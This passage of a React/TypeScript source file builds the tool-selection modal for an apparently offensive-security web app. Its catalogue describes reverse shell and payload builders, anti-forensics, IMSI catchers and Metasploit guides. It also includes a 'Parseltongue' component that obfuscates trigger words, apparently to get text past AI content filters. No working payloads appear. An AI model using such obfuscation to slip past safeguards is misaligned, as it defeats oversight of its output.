import { useEffect, useMemo, useRef, useState } from "react";
import { Dialog, DialogContentTop, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Switch } from "@/components/ui/switch";
import {
  Copy, Check, Search, Network, Bug, FileCode, KeyRound, Globe, Code as CodeIcon,
  RefreshCw, Hash, Link as LinkIcon, FileJson, Binary, Fingerprint, ScanLine,
  Server, Lock as LockIcon, QrCode, Zap, Calculator, Regex, Sparkles, Terminal, ShieldAlert, Cookie,
  Wand2, Image as ImageIcon, FileText, Languages, BookOpenCheck, Activity, UserCog, TrendingUp, Mail,
  AtSign, Wallet, Eye, Send, Database as DbIcon, Container as ContainerIcon, FileSearch, Radar, Crosshair, ScrollText, FileCheck2, GitCommit, Music, Palette, Brain as BrainIcon, ShieldCheck, FlaskConical, ArrowLeftRight,
} from "lucide-react";
void Zap;
import { useToast } from "@/hooks/use-toast";
import { streamChat } from "@/lib/chat-client";

export type UtilityTool =
  | "Password Generator"
  | "Email Lookup"
  | "IP/Domain Scanner"
  | "Hash Cracker"
  | "Vulnerability Scanner"
  | "Agent IDE"
  | "Dark Web Search"
  | "WHOIS Lookup"
  | "DNS Lookup"
  | "Subdomain Finder"
  | "SSL Checker"
  | "HTTP Headers"
  | "Reverse Shell Builder"
  | "Payload Library"
  | "Hash Generator"
  | "Base64 Tool"
  | "URL Encoder"
  | "JWT Decoder"
  | "Cipher Tools"
  | "UUID Generator"
  | "SSH Key Generator"
  | "User Agent Generator"
  | "QR Code Generator"
  | "CIDR Calculator"
  | "Regex Tester"
  | "JSON Formatter"
  | "AI Prompt Enhancer"
  | "AI Image Prompt"
  | "AI Code Explainer"
  | "AI Summarizer"
  | "AI Translator"
  | "AI Phishing Detector"
  | "AI CVE Explainer"
  | "AI Log Analyzer"
  | "AI Persona Generator"
  | "AI SEO Writer"
  | "AI Email Composer"
  | "OSINT Username Search"
  | "Wallet Validator"
  | "Steganography"
  | "HTTP Request Builder"
  | "GraphQL Introspection"
  | "Dockerfile Generator"
  | "AI YARA Rule Builder"
  | "AI Sigma Rule Builder"
  | "AI MITRE ATT&CK Mapper"
  | "AI Bug Bounty Report"
  | "AI Smart Contract Auditor"
  | "AI Git Commit Generator"
  | "Color Palette Generator"
  | "AI Lyrics Composer"
  | "AI Threat Modeler"
  | "AI Password Auditor"
  | "AI Image Generator"
  | "Parseltongue"
  // ── 48 AI add-on tools (pull list from AI_TOOL_PROMPTS) ──
  | "AI Resume Builder" | "AI Cover Letter" | "AI Interview Prep" | "AI Slogan Generator"
  | "AI Tweet Composer" | "AI Reddit Reply" | "AI Email Replier" | "AI Meeting Summarizer"
  | "AI Standup Note" | "AI PR Description" | "AI Bug Triage" | "AI Test Case Writer"
  | "AI Unit Test Generator" | "AI Code Refactor" | "AI Code Review" | "AI SQL Generator"
  | "AI SQL Optimizer" | "AI Schema Designer" | "AI Cron Builder" | "AI Markdown Cheatsheet"
  | "AI ASCII Art" | "AI Domain Name Ideas" | "AI Startup Pitch" | "AI Pitch Deck Outline"
  | "AI User Persona" | "AI A/B Test Idea" | "AI Lecture Notes" | "AI Flashcard Generator"
  | "AI Math Tutor" | "AI Recipe Generator" | "AI Workout Plan" | "AI Trip Itinerary"
  | "AI Story Plot" | "AI Joke Generator" | "AI Movie Recommender" | "AI Book Recommender"
  | "AI Investment Thesis" | "AI Stock Snapshot" | "AI Crypto Project Audit" | "AI Real Estate Analyzer"
  | "AI Negotiation Coach" | "AI Mediator" | "AI Therapy Companion" | "AI Lawyer (Educational)"
  | "AI Tax Reviewer" | "AI Insurance Optimizer" | "AI Travel Visa Help" | "AI Chess Coach"
  // ── Cybersecurity Educational Tools ──
  | "Zero-Day Exploits" | "RaaS Architecture" | "Supply Chain Attacks" | "Fileless Malware"
  | "Autonomous Offensive AI" | "Quantum Attacks" | "Bio-Digital Threats" | "AI Model Poisoning"
  | "Kali WiFi Hacking" | "Kali MITM Attack" | "Kali Metasploit" | "Kali SQLi Guide"
  // ── Advanced Arsenal ──
  | "BlackArch Arsenal" | "SDR & RF Hacking" | "Whonix / QubesOS OPSEC" | "GPU Brute Force"
  | "Custom LFS Build" | "Zero-Day OS Systems" | "Anti-Forensics Suite"
  | "Satellite Hacking" | "Automotive / CAN Bus" | "IMSI Catcher / Fake BTS";

export const ALL_TOOLS: { tool: UtilityTool; category: ToolCategory; icon: React.ElementType; color: string; desc: string }[] = [
  { tool: "Email Lookup", category: "Recon", icon: Search, color: "text-blue-400", desc: "Check an address against breach datasets." },
  { tool: "WHOIS Lookup", category: "Recon", icon: Server, color: "text-blue-400", desc: "Domain registration & ownership records." },
  { tool: "DNS Lookup", category: "Recon", icon: Network, color: "text-blue-400", desc: "Resolve A, AAAA, MX, TXT, NS records." },
  { tool: "Subdomain Finder", category: "Recon", icon: ScanLine, color: "text-blue-400", desc: "Enumerate live subdomains for a target." },
  { tool: "IP/Domain Scanner", category: "Recon", icon: Network, color: "text-amber-400", desc: "Quick recon sweep against IP or domain." },
  { tool: "SSL Checker", category: "Recon", icon: LockIcon, color: "text-emerald-400", desc: "Inspect TLS chain, expiry, ciphers." },
  { tool: "HTTP Headers", category: "Recon", icon: Cookie, color: "text-amber-400", desc: "Audit security headers of a URL." },
  { tool: "Dark Web Search", category: "Recon", icon: Globe, color: "text-purple-400", desc: "Search leaked datasets and .onion mirrors." },

  { tool: "Hash Cracker", category: "Offensive", icon: FileCode, color: "text-purple-400", desc: "Identify hash type and dictionary crack." },
  { tool: "Vulnerability Scanner", category: "Offensive", icon: Bug, color: "text-primary", desc: "Surface common CVEs and misconfigs." },
  { tool: "Reverse Shell Builder", category: "Offensive", icon: Terminal, color: "text-primary", desc: "Generate one-liners across 8 languages." },
  { tool: "Payload Library", category: "Offensive", icon: ShieldAlert, color: "text-primary", desc: "XSS, SQLi, LFI, SSTI, command injection." },
  { tool: "Agent IDE", category: "Offensive", icon: CodeIcon, color: "text-blue-400", desc: "Generate offensive code snippets." },

  { tool: "Hash Generator", category: "Crypto", icon: Hash, color: "text-emerald-400", desc: "SHA-1 / 256 / 384 / 512 of any text." },
  { tool: "Base64 Tool", category: "Crypto", icon: Binary, color: "text-emerald-400", desc: "Encode and decode Base64 instantly." },
  { tool: "URL Encoder", category: "Crypto", icon: LinkIcon, color: "text-emerald-400", desc: "URI percent-encode and decode." },
  { tool: "JWT Decoder", category: "Crypto", icon: Fingerprint, color: "text-emerald-400", desc: "Decode header & payload, no signature." },
  { tool: "Cipher Tools", category: "Crypto", icon: KeyRound, color: "text-emerald-400", desc: "ROT13, Caesar, Atbash classic ciphers." },

  { tool: "Password Generator", category: "Generators", icon: KeyRound, color: "text-emerald-400", desc: "Generate strong, configurable passwords." },
  { tool: "UUID Generator", category: "Generators", icon: Sparkles, color: "text-emerald-400", desc: "Cryptographically random UUID v4." },
  { tool: "SSH Key Generator", category: "Generators", icon: KeyRound, color: "text-emerald-400", desc: "Sample RSA / ED25519 keypair preview." },
  { tool: "User Agent Generator", category: "Generators", icon: Globe, color: "text-emerald-400", desc: "Realistic UA strings for testing." },
  { tool: "QR Code Generator", category: "Generators", icon: QrCode, color: "text-emerald-400", desc: "Render a QR for URLs, WiFi, text." },

  { tool: "CIDR Calculator", category: "Utilities", icon: Calculator, color: "text-blue-400", desc: "Subnet ranges, masks, host counts." },
  { tool: "Regex Tester", category: "Utilities", icon: Regex, color: "text-blue-400", desc: "Test patterns with live highlighting." },
  { tool: "JSON Formatter", category: "Utilities", icon: FileJson, color: "text-blue-400", desc: "Beautify, minify, validate JSON." },

  { tool: "AI Prompt Enhancer", category: "AI Studio", icon: Wand2, color: "text-fuchsia-400", desc: "Rewrite a vague prompt into a structured one." },
  { tool: "AI Image Prompt", category: "AI Studio", icon: ImageIcon, color: "text-fuchsia-400", desc: "Generate Midjourney / SD style prompts." },
  { tool: "AI Code Explainer", category: "AI Studio", icon: FileText, color: "text-fuchsia-400", desc: "Explain pasted code in plain language." },
  { tool: "AI Summarizer", category: "AI Studio", icon: BookOpenCheck, color: "text-fuchsia-400", desc: "Extract the key sentences from any text." },
  { tool: "AI Translator", category: "AI Studio", icon: Languages, color: "text-fuchsia-400", desc: "Translate between English & Arabic." },
  { tool: "AI Phishing Detector", category: "AI Studio", icon: ShieldAlert, color: "text-fuchsia-400", desc: "Score URLs and emails for phishing risk." },
  { tool: "AI CVE Explainer", category: "AI Studio", icon: ShieldAlert, color: "text-fuchsia-400", desc: "Look up a CVE and get a plain-English brief." },
  { tool: "AI Log Analyzer", category: "AI Studio", icon: Activity, color: "text-fuchsia-400", desc: "Parse log lines, surface errors and IPs." },
  { tool: "AI Persona Generator", category: "AI Studio", icon: UserCog, color: "text-fuchsia-400", desc: "Build a sock-puppet identity for OSINT." },
  { tool: "AI SEO Writer", category: "AI Studio", icon: TrendingUp, color: "text-fuchsia-400", desc: "Generate SEO title, description & keywords." },
  { tool: "AI Email Composer", category: "AI Studio", icon: Mail, color: "text-fuchsia-400", desc: "Draft a professional email from a brief." },

  { tool: "OSINT Username Search", category: "Recon", icon: AtSign, color: "text-blue-400", desc: "Hunt a username across 30+ social platforms." },
  { tool: "GraphQL Introspection", category: "Recon", icon: DbIcon, color: "text-blue-400", desc: "Pull a GraphQL schema and surface dangerous fields." },

  { tool: "AI YARA Rule Builder", category: "Offensive", icon: FileSearch, color: "text-primary", desc: "Generate a YARA rule from indicators in seconds." },
  { tool: "AI Sigma Rule Builder", category: "Offensive", icon: Radar, color: "text-primary", desc: "Author Sigma detection rules from a description." },
  { tool: "AI Smart Contract Auditor", category: "Offensive", icon: FileCheck2, color: "text-primary", desc: "Spot common Solidity vulnerabilities (reentrancy, overflow, tx.origin)." },
  { tool: "AI Password Auditor", category: "Offensive", icon: ShieldCheck, color: "text-primary", desc: "Crack-resistance score, time-to-crack, leak check, suggestions." },
  { tool: "AI Image Generator", category: "Generators", icon: ImageIcon, color: "text-pink-400", desc: "Generate images from a text prompt with quality and size controls." },

  { tool: "Wallet Validator", category: "Crypto", icon: Wallet, color: "text-emerald-400", desc: "Validate BTC, ETH, SOL, TRX and LTC addresses." },
  { tool: "Steganography", category: "Crypto", icon: Eye, color: "text-emerald-400", desc: "Hide and extract messages using zero-width characters." },

  { tool: "Dockerfile Generator", category: "Generators", icon: ContainerIcon, color: "text-emerald-400", desc: "Compose production-ready Dockerfiles for any stack." },
  { tool: "Color Palette Generator", category: "Generators", icon: Palette, color: "text-emerald-400", desc: "Build accessible 5-color palettes from a base hue." },

  { tool: "HTTP Request Builder", category: "Utilities", icon: Send, color: "text-blue-400", desc: "Compose, send and inspect any HTTP request live." },

  { tool: "AI MITRE ATT&CK Mapper", category: "AI Studio", icon: Crosshair, color: "text-fuchsia-400", desc: "Map an incident description to ATT&CK tactics & techniques." },
  { tool: "AI Bug Bounty Report", category: "AI Studio", icon: ScrollText, color: "text-fuchsia-400", desc: "Auto-write a HackerOne-style report from finding details." },
  { tool: "AI Git Commit Generator", category: "AI Studio", icon: GitCommit, color: "text-fuchsia-400", desc: "Generate Conventional Commit messages from a diff summary." },
  { tool: "AI Threat Modeler", category: "AI Studio", icon: BrainIcon, color: "text-fuchsia-400", desc: "STRIDE threat model for any system in one click." },
  { tool: "AI Lyrics Composer", category: "AI Studio", icon: Music, color: "text-fuchsia-400", desc: "Write song lyrics in any genre and language." },

  { tool: "Parseltongue", category: "Crypto", icon: FlaskConical, color: "text-emerald-400", desc: "6 text-obfuscation techniques (leetspeak, bubble, braille, morse, unicode, NATO) over 33 trigger words." },

  // ── 48 AI add-on tools ──
  { tool: "AI Resume Builder", category: "AI Studio", icon: ScrollText, color: "text-fuchsia-400", desc: "Polished one-page résumé in markdown from your notes." },
  { tool: "AI Cover Letter", category: "AI Studio", icon: Mail, color: "text-fuchsia-400", desc: "Sharp, sincere 200-word cover letter from a brief." },
  { tool: "AI Interview Prep", category: "AI Studio", icon: BookOpenCheck, color: "text-fuchsia-400", desc: "12 likely interview questions with model answers for any role." },
  { tool: "AI Slogan Generator", category: "AI Studio", icon: Sparkles, color: "text-fuchsia-400", desc: "10 catchy brand slogans from a one-liner." },
  { tool: "AI Tweet Composer", category: "AI Studio", icon: Send, color: "text-fuchsia-400", desc: "5 ≤280-char tweets across 5 distinct tones." },
  { tool: "AI Reddit Reply", category: "AI Studio", icon: FileText, color: "text-fuchsia-400", desc: "Thoughtful, helpful Reddit reply from a post." },
  { tool: "AI Email Replier", category: "AI Studio", icon: Mail, color: "text-fuchsia-400", desc: "Professional, concise reply to any email." },
  { tool: "AI Meeting Summarizer", category: "AI Studio", icon: BookOpenCheck, color: "text-fuchsia-400", desc: "Decisions / action items / open questions from a transcript." },
  { tool: "AI Standup Note", category: "AI Studio", icon: ScrollText, color: "text-fuchsia-400", desc: "Yesterday / Today / Blockers from your notes." },
  { tool: "AI PR Description", category: "AI Studio", icon: GitCommit, color: "text-fuchsia-400", desc: "Clean GitHub PR description from a diff summary." },
  { tool: "AI Bug Triage", category: "AI Studio", icon: Bug, color: "text-fuchsia-400", desc: "Severity, root-cause area, and follow-up questions." },
  { tool: "AI Test Case Writer", category: "AI Studio", icon: FileCheck2, color: "text-fuchsia-400", desc: "Positive, negative, and edge cases for any feature." },
  { tool: "AI Unit Test Generator", category: "AI Studio", icon: FileCode, color: "text-fuchsia-400", desc: "Thorough Jest/Vitest tests for pasted code." },
  { tool: "AI Code Refactor", category: "AI Studio", icon: CodeIcon, color: "text-fuchsia-400", desc: "Refactor for clarity & performance, with explanations." },
  { tool: "AI Code Review", category: "AI Studio", icon: FileCheck2, color: "text-fuchsia-400", desc: "Senior-engineer review: bugs, security, perf, naming." },
  { tool: "AI SQL Generator", category: "AI Studio", icon: DbIcon, color: "text-fuchsia-400", desc: "English → clean PostgreSQL with explanation." },
  { tool: "AI SQL Optimizer", category: "AI Studio", icon: DbIcon, color: "text-fuchsia-400", desc: "Rewrite SQL, add indexes, explain why." },
  { tool: "AI Schema Designer", category: "AI Studio", icon: DbIcon, color: "text-fuchsia-400", desc: "Normalized PostgreSQL schema for any app." },
  { tool: "AI Cron Builder", category: "AI Studio", icon: RefreshCw, color: "text-fuchsia-400", desc: "English schedule → cron expression + explanation." },
  { tool: "AI Markdown Cheatsheet", category: "AI Studio", icon: FileText, color: "text-fuchsia-400", desc: "Markdown cheatsheet for any topic." },
  { tool: "AI ASCII Art", category: "AI Studio", icon: Sparkles, color: "text-fuchsia-400", desc: "ASCII art (≤60 wide) for any subject." },
  { tool: "AI Domain Name Ideas", category: "AI Studio", icon: Globe, color: "text-fuchsia-400", desc: "15 catchy .com domain ideas from a concept." },
  { tool: "AI Startup Pitch", category: "AI Studio", icon: TrendingUp, color: "text-fuchsia-400", desc: "60-second elevator pitch for any idea." },
  { tool: "AI Pitch Deck Outline", category: "AI Studio", icon: ScrollText, color: "text-fuchsia-400", desc: "12-slide investor deck outline for any idea." },
  { tool: "AI User Persona", category: "AI Studio", icon: UserCog, color: "text-fuchsia-400", desc: "3 detailed user personas with goals & frustrations." },
  { tool: "AI A/B Test Idea", category: "AI Studio", icon: Activity, color: "text-fuchsia-400", desc: "5 A/B tests with hypotheses, metrics, and risks." },
  { tool: "AI Lecture Notes", category: "AI Studio", icon: BookOpenCheck, color: "text-fuchsia-400", desc: "Clean lecture notes + 5-question quiz from a transcript." },
  { tool: "AI Flashcard Generator", category: "AI Studio", icon: ScrollText, color: "text-fuchsia-400", desc: "15 Anki-ready Q | A flashcards from any content." },
  { tool: "AI Math Tutor", category: "AI Studio", icon: Calculator, color: "text-fuchsia-400", desc: "Solve & explain a math problem + 2 practice problems." },
  { tool: "AI Recipe Generator", category: "AI Studio", icon: BrainIcon, color: "text-fuchsia-400", desc: "Recipe with grams, steps, time and calories." },
  { tool: "AI Workout Plan", category: "AI Studio", icon: Activity, color: "text-fuchsia-400", desc: "7-day workout plan with sets × reps and RPE." },
  { tool: "AI Trip Itinerary", category: "AI Studio", icon: Globe, color: "text-fuchsia-400", desc: "Day-by-day itinerary with food, sights and budget." },
  { tool: "AI Story Plot", category: "AI Studio", icon: FileText, color: "text-fuchsia-400", desc: "3-act story plot with characters, conflict, and twist." },
  { tool: "AI Joke Generator", category: "AI Studio", icon: Sparkles, color: "text-fuchsia-400", desc: "5 clever, original jokes about any topic." },
  { tool: "AI Movie Recommender", category: "AI Studio", icon: TrendingUp, color: "text-fuchsia-400", desc: "7 movies tailored to your taste, with one-line reasons." },
  { tool: "AI Book Recommender", category: "AI Studio", icon: BookOpenCheck, color: "text-fuchsia-400", desc: "7 books tailored to your taste, with one-line reasons." },
  { tool: "AI Investment Thesis", category: "AI Studio", icon: TrendingUp, color: "text-fuchsia-400", desc: "1-page thesis: bull, bear, base case, key risks." },
  { tool: "AI Stock Snapshot", category: "AI Studio", icon: TrendingUp, color: "text-fuchsia-400", desc: "Plain-English snapshot: business, financials, moat, risks." },
  { tool: "AI Crypto Project Audit", category: "AI Studio", icon: ShieldAlert, color: "text-fuchsia-400", desc: "Red flags: team, tokenomics, contracts, traction." },
  { tool: "AI Real Estate Analyzer", category: "AI Studio", icon: Calculator, color: "text-fuchsia-400", desc: "Cap rate, cashflow, risks and seller questions." },
  { tool: "AI Negotiation Coach", category: "AI Studio", icon: BrainIcon, color: "text-fuchsia-400", desc: "Talking points, BATNA, and 3 likely counter-moves." },
  { tool: "AI Mediator", category: "AI Studio", icon: BrainIcon, color: "text-fuchsia-400", desc: "Summarize both sides, find common ground, propose next steps." },
  { tool: "AI Therapy Companion", category: "AI Studio", icon: BrainIcon, color: "text-fuchsia-400", desc: "Calm, non-judgmental listener (not medical advice)." },
  { tool: "AI Lawyer (Educational)", category: "AI Studio", icon: ScrollText, color: "text-fuchsia-400", desc: "Plain-English legal landscape (not legal advice)." },
  { tool: "AI Tax Reviewer", category: "AI Studio", icon: Calculator, color: "text-fuchsia-400", desc: "Surface deductions, credits, red flags (educational)." },
  { tool: "AI Insurance Optimizer", category: "AI Studio", icon: ShieldCheck, color: "text-fuchsia-400", desc: "Gaps, overlaps, and 3 ways to optimize cost vs coverage." },
  { tool: "AI Travel Visa Help", category: "AI Studio", icon: Globe, color: "text-fuchsia-400", desc: "Plain-English visa requirements (confirm with consulate)." },
  { tool: "AI Chess Coach", category: "AI Studio", icon: BrainIcon, color: "text-fuchsia-400", desc: "Best move with explanation + a training plan." },

  // ── Cybersecurity Educational Tools ──
  { tool: "Zero-Day Exploits", category: "Offensive", icon: ShieldAlert, color: "text-red-400", desc: "دورة تعليمية شاملة عن ثغرات يوم الصفر — lifecycle, discovery, weaponization, defense." },
  { tool: "RaaS Architecture", category: "Offensive", icon: BrainIcon, color: "text-red-400", desc: "كيف تعمل الفدية كخدمة — RaaS ecosystem, affiliate models, kill chain." },
  { tool: "Supply Chain Attacks", category: "Offensive", icon: ShieldAlert, color: "text-orange-400", desc: "هجمات سلسلة التوريد — vectors, real-world cases (SolarWinds, XZ Utils), defenses." },
  { tool: "Fileless Malware", category: "Offensive", icon: FileSearch, color: "text-orange-400", desc: "البرمجيات الخبيثة بلا ملفات — LOLBins, memory-only execution, detection evasion." },
  { tool: "Autonomous Offensive AI", category: "Offensive", icon: BrainIcon, color: "text-red-500", desc: "الذكاء الاصطناعي الهجومي المستقل — AI-driven recon, exploit generation, autonomous C2." },
  { tool: "Quantum Attacks", category: "Offensive", icon: Zap, color: "text-violet-400", desc: "تهديدات الحوسبة الكمية — Shor's algorithm, post-quantum cryptography, harvest-now-decrypt-later." },
  { tool: "Bio-Digital Threats", category: "Offensive", icon: FlaskConical, color: "text-emerald-400", desc: "تهديدات الاندماج الرقمي البيولوجي — DNA storage hacks, implant attacks, biometric spoofing." },
  { tool: "AI Model Poisoning", category: "Offensive", icon: BrainIcon, color: "text-pink-400", desc: "تسميم نماذج الذكاء الاصطناعي — data poisoning, backdoor attacks, adversarial examples." },
  { tool: "Kali WiFi Hacking", category: "Offensive", icon: Radar, color: "text-cyan-400", desc: "اختراق الشبكات اللاسلكية بـ Kali — aircrack-ng, handshake capture, Evil Twin, WPA3." },
  { tool: "Kali MITM Attack", category: "Offensive", icon: ArrowLeftRight, color: "text-amber-400", desc: "هجوم الوسيط بـ Kali — Bettercap, ARP spoofing, SSL stripping, credential capture." },
  { tool: "Kali Metasploit", category: "Offensive", icon: Terminal, color: "text-red-400", desc: "إطار Metasploit الكامل — modules, payloads, meterpreter, post-exploitation, pivoting." },
  { tool: "Kali SQLi Guide", category: "Offensive", icon: DbIcon, color: "text-blue-400", desc: "حقن SQL بأدوات Kali — sqlmap, manual injection, WAF bypass, DB dumping, OS shell." },

  // ── Advanced Arsenal ──
  { tool: "BlackArch Arsenal", category: "Advanced", icon: Terminal, color: "text-red-400", desc: "ترسانة BlackArch الكاملة — 2800+ أداة، multi-tool attack chains، satellite, automotive, RF." },
  { tool: "SDR & RF Hacking", category: "Advanced", icon: Radar, color: "text-cyan-400", desc: "اختراق الترددات الراديوية — DragonOS، GSM، GPS spoofing، satellite، ADS-B، TPMS." },
  { tool: "Whonix / QubesOS OPSEC", category: "Advanced", icon: ShieldCheck, color: "text-violet-400", desc: "إخفاء الهوية المتقدم — Whonix+QubesOS، Tor، تسريب الـ IP، OpSec الكامل." },
  { tool: "GPU Brute Force", category: "Advanced", icon: Zap, color: "text-amber-400", desc: "كسر كلمات المرور بـ GPU — hashcat RTX، mask attacks، rule-based، benchmark." },
  { tool: "Custom LFS Build", category: "Advanced", icon: CodeIcon, color: "text-emerald-400", desc: "بناء نظام تشغيل مخصص من الصفر — LFS، kernel hardening، stealth OS." },
  { tool: "Zero-Day OS Systems", category: "Advanced", icon: ShieldAlert, color: "text-red-500", desc: "أنظمة التشغيل التجارية للثغرات — Pegasus، NSO Group، zero-click exploits، implants." },
  { tool: "Anti-Forensics Suite", category: "Advanced", icon: Eye, color: "text-purple-400", desc: "مجموعة مكافحة الجنائيات — RAM wiping، secure delete، metadata scrubbing، log poisoning." },
  { tool: "Satellite Hacking", category: "Advanced", icon: Globe, color: "text-cyan-400", desc: "اختراق الأقمار الصناعية — VSAT، Iridium، GPS spoofing، DVB-S، Starlink recon." },
  { tool: "Automotive / CAN Bus", category: "Advanced", icon: Network, color: "text-orange-400", desc: "اختراق شبكات السيارات — CAN Bus، OBD2، ECU flashing، keyless relay attacks." },
  { tool: "IMSI Catcher / Fake BTS", category: "Advanced", icon: ScanLine, color: "text-red-400", desc: "محطات الاتصال المزيفة — IMSI catchers، GSM eavesdropping، OSMOCOM، 4G downgrade." },
];

export type ToolCategory = "Recon" | "Offensive" | "Crypto" | "Generators" | "Utilities" | "AI Studio" | "Advanced";

export const CATEGORIES: ToolCategory[] = ["AI Studio", "Recon", "Offensive", "Advanced", "Crypto", "Generators", "Utilities"];

const META = ALL_TOOLS.reduce((acc, t) => { acc[t.tool] = t; return acc; }, {} as Record<UtilityTool, (typeof ALL_TOOLS)[number]>);

export function UtilityToolModal({
  tool,
  onOpenChange,
}: {
  tool: UtilityTool | null;
  onOpenChange: (v: boolean) => void;
}) {
  const open = !!tool;
  const meta = tool ? META[tool] : null;
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContentTop className="bg-card border-border w-[96vw] max-w-lg max-h-[80vh] overflow-y-auto"
        onOpenAutoFocus={(e) => e.preventDefault()}>
        {tool && meta && (
          <>
            <DialogHeader>
              <DialogTitle className="flex items-center gap-2">
                <meta.icon className={`w-5 h-5 ${meta.color}`} />
                {tool}
              </DialogTitle>
              <DialogDescription>{meta.desc}</DialogDescription>
            </DialogHeader>
            <div className="mt-1">
              {tool === "Password Generator" && <PasswordGenerator />}
              {tool === "Email Lookup" && <EmailLookup />}
              {tool === "IP/Domain Scanner" && <IpScanner />}
              {tool === "Hash Cracker" && <HashCracker />}
              {tool === "Vulnerability Scanner" && <VulnScanner />}
              {tool === "Agent IDE" && <AgentIde />}
              {tool === "Dark Web Search" && <DarkWebSearch />}
              {tool === "WHOIS Lookup" && <WhoisLookup />}
              {tool === "DNS Lookup" && <DnsLookup />}
              {tool === "Subdomain Finder" && <SubdomainFinder />}
              {tool === "SSL Checker" && <SslChecker />}
              {tool === "HTTP Headers" && <HttpHeaders />}
              {tool === "Reverse Shell Builder" && <ReverseShellBuilder />}
              {tool === "Payload Library" && <PayloadLibrary />}
              {tool === "Hash Generator" && <HashGenerator />}
              {tool === "Base64 Tool" && <Base64Tool />}
              {tool === "URL Encoder" && <UrlEncoder />}
              {tool === "JWT Decoder" && <JwtDecoder />}
              {tool === "Cipher Tools" && <CipherTools />}
              {tool === "UUID Generator" && <UuidGenerator />}
              {tool === "SSH Key Generator" && <SshKeyGenerator />}
              {tool === "User Agent Generator" && <UserAgentGenerator />}
              {tool === "QR Code Generator" && <QrCodeGenerator />}
              {tool === "CIDR Calculator" && <CidrCalculator />}
              {tool === "Regex Tester" && <RegexTester />}
              {tool === "JSON Formatter" && <JsonFormatter />}
              {tool === "AI Prompt Enhancer" && <AiPromptEnhancer />}
              {tool === "AI Image Prompt" && <AiImagePrompt />}
              {tool === "AI Code Explainer" && <AiCodeExplainer />}
              {tool === "AI Summarizer" && <AiSummarizer />}
              {tool === "AI Translator" && <AiTranslator />}
              {tool === "AI Phishing Detector" && <AiPhishingDetector />}
              {tool === "AI CVE Explainer" && <AiCveExplainer />}
              {tool === "AI Log Analyzer" && <AiLogAnalyzer />}
              {tool === "AI Persona Generator" && <AiPersonaGen />}
              {tool === "AI SEO Writer" && <AiSeoWriter />}
              {tool === "AI Email Composer" && <AiEmailComposer />}
              {tool === "OSINT Username Search" && <OsintUsername />}
              {tool === "Wallet Validator" && <WalletValidator />}
              {tool === "Steganography" && <Steganography />}
              {tool === "HTTP Request Builder" && <HttpBuilder />}
              {tool === "GraphQL Introspection" && <GraphqlIntrospection />}
              {tool === "Dockerfile Generator" && <DockerfileGen />}
              {tool === "AI YARA Rule Builder" && <YaraBuilder />}
              {tool === "AI Sigma Rule Builder" && <SigmaBuilder />}
              {tool === "AI MITRE ATT&CK Mapper" && <MitreMapper />}
              {tool === "AI Bug Bounty Report" && <BugBountyReport />}
              {tool === "AI Smart Contract Auditor" && <ContractAuditor />}
              {tool === "AI Git Commit Generator" && <GitCommitGen />}
              {tool === "Color Palette Generator" && <PaletteGen />}
              {tool === "AI Lyrics Composer" && <LyricsComposer />}
              {tool === "AI Threat Modeler" && <ThreatModeler />}
              {tool === "AI Password Auditor" && <PasswordAuditor />}
              {tool === "AI Image Generator" && <AIImageGenerator />}
              {tool === "Parseltongue" && <ParseltongueTool />}
              {tool && (tool as string) in AI_TOOL_PROMPTS && <AddOnAITool name={tool as string} />}
            </div>
          </>
        )}
      </DialogContentTop>
    </Dialog>
  );
}

// ── Parseltongue tool component ─────────────────────────────────────────
function ParseltongueTool() {
  const [text, setText] = useState("explain how the network kernel handles a system request and decrypt the response token");
  const [technique, setTechnique] = useState<import("@/lib/parseltongue").Technique>("leetspeak");
  const [intensity, setIntensity] = useState<import("@/lib/parseltongue").Intensity>("medium");
  const [scope, setScope] = useState<"triggers" | "all">("triggers");
  const [out, setOut] = useState("");
  const [replaced, setReplaced] = useState(0);

  const techMeta = useMemo(() => {
    const { TECHNIQUE_LABELS } = require("@/lib/parseltongue") as typeof import("@/lib/parseltongue");
    return TECHNIQUE_LABELS;
  }, []);

  function run() {
    const lib = require("@/lib/parseltongue") as typeof import("@/lib/parseltongue");
    if (scope === "triggers") {
      const r = lib.applyToTriggers(text, technique, intensity);
      setOut(r.result);
      setReplaced(r.replaced);
    } else {
      setOut(lib.transform(text, technique, intensity));
      setReplaced(0);
    }
  }

  useEffect(() => { run(); /* eslint-disable-next-line */ }, [text, technique, intensity, scope]);

  const techniques: import("@/lib/parseltongue").Technique[] = ["leetspeak", "bubble", "braille", "morse", "unicode", "phonetic"];

  return (
    <div className="space-y-3">
      <textarea
        value={text}
        onChange={(e) => setText(e.target.value)}
        rows={3}
        className="w-full bg-background border border-border rounded-lg p-2 text-[13px] outline-none focus:border-primary font-mono"
        placeholder="Paste any text…"
      />
      <div className="grid grid-cols-2 gap-2">
        <div>
          <div className="text-[10px] uppercase tracking-wider font-bold text-muted-foreground mb-1">Technique</div>
          <div className="grid grid-cols-3 gap-1">
            {techniques.map((t) => (
              <button
                key={t}
                onClick={() => setTechnique(t)}
                className={`px-2 py-1 rounded-md border text-[10.5px] font-semibold ${technique === t ? "border-primary bg-primary/10 text-primary" : "border-border hover:border-primary/40"}`}
              >
                {techMeta[t].label}
              </button>
            ))}
          </div>
        </div>
        <div>
          <div className="text-[10px] uppercase tracking-wider font-bold text-muted-foreground mb-1">Intensity</div>
          <div className="grid grid-cols-3 gap-1 mb-2">
            {(["light", "medium", "heavy"] as const).map((i) => (
              <button
                key={i}
                onClick={() => setIntensity(i)}
                className={`px-2 py-1 rounded-md border text-[10.5px] font-semibold capitalize ${intensity === i ? "border-primary bg-primary/10 text-primary" : "border-border hover:border-primary/40"}`}
              >
                {i}
              </button>
            ))}
          </div>
          <div className="text-[10px] uppercase tracking-wider font-bold text-muted-foreground mb-1">Scope</div>
          <div className="grid grid-cols-2 gap-1">
            {(["triggers", "all"] as const).map((s) => (
              <button
                key={s}
                onClick={() => setScope(s)}
                className={`px-2 py-1 rounded-md border text-[10.5px] font-semibold ${scope === s ? "border-primary bg-primary/10 text-primary" : "border-border hover:border-primary/40"}`}
              >
                {s === "triggers" ? "Trigger words only" : "Entire text"}
              </button>
            ))}
          </div>
        </div>
      </div>
      <div className="text-[10.5px] text-muted-foreground leading-snug">
        {techMeta[technique].blurb}
        {scope === "triggers" && (
          <span className="ml-1 font-mono text-primary">· {replaced} trigger word{replaced === 1 ? "" : "s"} replaced</span>
        )}
      </div>
